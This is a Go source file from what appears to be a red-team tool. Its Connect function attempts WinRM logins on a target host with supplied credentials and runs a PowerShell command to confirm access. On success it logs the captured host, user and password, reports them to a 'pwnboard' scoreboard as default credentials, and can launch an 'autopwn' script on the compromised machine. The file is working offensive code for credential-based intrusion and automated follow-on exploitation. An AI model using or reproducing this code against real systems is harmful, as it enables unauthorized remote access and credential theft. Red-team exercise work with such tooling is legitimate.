package winrm

import (
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/masterzen/winrm"
	"github.com/opt/red-script/internal/autopwn"
	"github.com/opt/red-script/internal/files"
	"github.com/opt/red-script/internal/pwnboard"
)

const ERR_PREFIX string = "ERROR(winrmClient): "

// Default port set to 5985 (the default port for WinRM http connections)
const DEFAULT_PORT int = 5985

// Function that uses provided host, user, and password to attempt to log
//	into WinRM and execute a simple command. If login is sucessful, the function
//	will also attempt to alert pwnboard.
func Connect(host, user, password string, scriptPath string, wg *sync.WaitGroup) {
	defer wg.Done()

	// Setting the port that WinRM will be accessed from
	port := DEFAULT_PORT

	// Creating a new endpoint that specifies the details of the WinRM connection
	endpoint := winrm.NewEndpoint(host, port, false, true, nil, nil, nil, 10*time.Second)

	// Create client that will manage the WinRM connection
	params := winrm.DefaultParameters
	params.TransportDecorator = func() winrm.Transporter { return &winrm.ClientNTLM{} }
	client, err := winrm.NewClientWithParameters(endpoint, user, password, params)

	if err != nil {
		os.Stderr.WriteString(ERR_PREFIX + "Failed to log into WinRM.\n")
		os.Stderr.WriteString(err.Error() + "\n")
		return
	}

	// Attempt to run a basic powershell command through WinRM
	cmd := winrm.Powershell("ipconfig")
	_, err = client.Run(cmd, os.Stdout, os.Stderr)
	if err != nil {
		os.Stderr.WriteString(ERR_PREFIX + "Failed to execute command through WinRM.\n")
		os.Stderr.WriteString(err.Error() + "\n")
		return
	}

	fmt.Println("Successful WinRM connection @" + host)

	files.WriterChan <- fmt.Sprintf("winrm:'%s':'%s':'%s'\n", host, user, password)
	pwnboard.SendUpdate(host, fmt.Sprintf("winrm:'%s':'%s':Default creds", user, password))

	if scriptPath != "" {
		autopwn.WinRMAutopwn(host, user, password, scriptPath)
	}
}
